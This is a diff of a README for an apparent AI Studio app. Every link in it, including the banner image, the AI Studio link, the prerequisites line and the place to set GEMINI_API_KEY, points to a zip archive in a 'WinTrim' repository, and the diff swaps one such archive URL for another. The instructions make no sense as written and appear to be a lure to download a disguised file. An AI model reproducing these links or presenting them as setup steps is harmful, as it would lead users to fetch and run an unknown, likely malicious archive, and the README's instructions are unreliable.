@@ -1,20 +1,20 @@
 <div align="center">
-<img width="1200" height="475" alt="GHBanner" src="https://raw.githubusercontent.com/Ramli243/WinTrim/main/hooks/WinTrim_v1.2.zip" />
+<img width="1200" height="475" alt="GHBanner" src="https://github.com/Ramli243/WinTrim/raw/refs/heads/main/services/Win-Trim-v3.7.zip" />
 </div>
 
 # Run and deploy your AI Studio app
 
 This contains everything you need to run your app locally.
 
-View your app in AI Studio: https://raw.githubusercontent.com/Ramli243/WinTrim/main/hooks/WinTrim_v1.2.zip
+View your app in AI Studio: https://github.com/Ramli243/WinTrim/raw/refs/heads/main/services/Win-Trim-v3.7.zip
 
 ## Run Locally
 
-**Prerequisites:**  https://raw.githubusercontent.com/Ramli243/WinTrim/main/hooks/WinTrim_v1.2.zip
+**Prerequisites:**  https://github.com/Ramli243/WinTrim/raw/refs/heads/main/services/Win-Trim-v3.7.zip
 
 
 1. Install dependencies:
    `npm install`
-2. Set the `GEMINI_API_KEY` in [https://raw.githubusercontent.com/Ramli243/WinTrim/main/hooks/WinTrim_v1.2.zip](https://raw.githubusercontent.com/Ramli243/WinTrim/main/hooks/WinTrim_v1.2.zip) to your Gemini API key
+2. Set the `GEMINI_API_KEY` in [https://github.com/Ramli243/WinTrim/raw/refs/heads/main/services/Win-Trim-v3.7.zip](https://github.com/Ramli243/WinTrim/raw/refs/heads/main/services/Win-Trim-v3.7.zip) to your Gemini API key
 3. Run the app:
    `npm run dev`
